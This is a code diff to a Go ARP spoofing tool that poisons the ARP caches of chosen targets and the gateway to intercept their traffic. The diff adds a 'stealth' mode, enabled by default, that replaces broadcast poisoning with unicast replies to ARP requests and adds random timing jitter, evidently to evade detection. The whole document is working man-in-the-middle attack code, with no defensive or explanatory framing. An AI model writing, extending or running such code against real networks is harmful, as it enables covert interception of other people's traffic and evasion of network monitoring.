@@ -22,6 +22,7 @@ type Spoofer struct {
 	StopChan      chan struct{}
 	stopOnce      sync.Once
 	handle        *pcap.Handle
+	Stealth       bool // [NEW] Stealth Mode
 }
 
 func NewSpoofer(iface string, myMAC net.HardwareAddr, myIP net.IP, gatewayIP net.IP, gatewayMAC net.HardwareAddr, session *models.SessionManager) *Spoofer {
@@ -33,6 +34,7 @@ func NewSpoofer(iface string, myMAC net.HardwareAddr, myIP net.IP, gatewayIP net
 		GatewayMAC:    gatewayMAC,
 		Session:       session,
 		StopChan:      make(chan struct{}),
+		Stealth:       true, // DEFAULT STEALTH
 	}
 }
 
@@ -55,19 +57,12 @@ func (s *Spoofer) Start() error {
 				s.RestoreAll()
 				return
 			case <-ticker.C:
-				targets := s.Session.GetAllTargets()
-				// Sequential Attack Loop to prevent goroutine leaks and concurrent pcap crashes
-				for _, t := range targets {
-					s.sendPoison(t.IP, t.MAC, s.GatewayIP, s.MyMAC)
-					s.sendPoison(s.GatewayIP, s.GatewayMAC, t.IP, s.MyMAC)
-				}
-				
-				time.Sleep(2 * time.Millisecond)
-				
-				// Double tap
-				for _, t := range targets {
-					s.sendPoison(t.IP, t.MAC, s.GatewayIP, s.MyMAC)
-					s.sendPoison(s.GatewayIP, s.GatewayMAC, t.IP, s.MyMAC)
+				if !s.Stealth {
+					targets := s.Session.GetAllTargets()
+					for _, t := range targets {
+						s.sendPoison(t.IP, t.MAC, s.GatewayIP, s.MyMAC)
+						s.sendPoison(s.GatewayIP, s.GatewayMAC, t.IP, s.MyMAC)
+					}
 				}
 			}
 		}
@@ -104,16 +99,25 @@ func (s *Spoofer) reactiveLoop() {
 			reqIP := net.IP(arp.DstProtAddress)
 			srcIP := net.IP(arp.SourceProtAddress)
 
+			// Jitter delay for stealth
+			time.Sleep(time.Duration(10+_randInt(20)) * time.Millisecond)
+
 			if reqIP.Equal(s.GatewayIP) {
 				if t := s.Session.GetTargetByIP(srcIP); t != nil {
-					s.sendPoison(t.IP, t.MAC, s.GatewayIP, s.MyMAC)
+					// REPLY TO REQUESTER (Unicast eth)
+					s.sendPoisonUnicast(t.IP, t.MAC, s.GatewayIP, s.MyMAC, arp.SourceHwAddress)
 				}
 			}
 			if t := s.Session.GetTargetByIP(reqIP); t != nil {
-				s.sendPoison(s.GatewayIP, s.GatewayMAC, t.IP, s.MyMAC)
+				// REPLY TO REQUESTER (Unicast eth)
+				s.sendPoisonUnicast(s.GatewayIP, s.GatewayMAC, t.IP, s.MyMAC, arp.SourceHwAddress)
 			}
 		}
 	}
+}
+
+func _randInt(n int) int {
+	return int(time.Now().UnixNano() % int64(n))
 }
 
 // [REMOVED] findTargetByIP is now handled by SessionManager.GetTargetByIP
@@ -142,14 +146,18 @@ func (s *Spoofer) RestoreTarget(t *models.TargetConfig) {
 }
 
 func (s *Spoofer) sendPoison(dstIP net.IP, dstMAC net.HardwareAddr, srcIP net.IP, srcMAC net.HardwareAddr) {
+	s.sendPoisonUnicast(dstIP, dstMAC, srcIP, srcMAC, dstMAC)
+}
+
+func (s *Spoofer) sendPoisonUnicast(dstIP net.IP, dstMAC net.HardwareAddr, srcIP net.IP, srcMAC net.HardwareAddr, ethDst net.HardwareAddr) {
 	if s.handle == nil { return }
-	eth := layers.Ethernet{ SrcMAC: s.MyMAC, DstMAC: dstMAC, EthernetType: layers.EthernetTypeARP }
+	eth := layers.Ethernet{ SrcMAC: s.MyMAC, DstMAC: ethDst, EthernetType: layers.EthernetTypeARP }
 	arp := layers.ARP{
 		AddrType: layers.LinkTypeEthernet, Protocol: layers.EthernetTypeIPv4, HwAddressSize: 6, ProtAddressSize: 4, Operation: layers.ARPReply,
 		SourceHwAddress: []byte(srcMAC), SourceProtAddress: []byte(srcIP), DstHwAddress: dstMAC, DstProtAddress: []byte(dstIP),
 	}
 	buf := gopacket.NewSerializeBuffer()
-	gopacket.SerializeLayers(buf, gopacket.SerializeOptions{}, &eth, &arp)
+	gopacket.SerializeLayers(buf, gopacket.SerializeOptions{FixLengths: true}, &eth, &arp)
 	_ = s.handle.WritePacketData(buf.Bytes())
 }
 
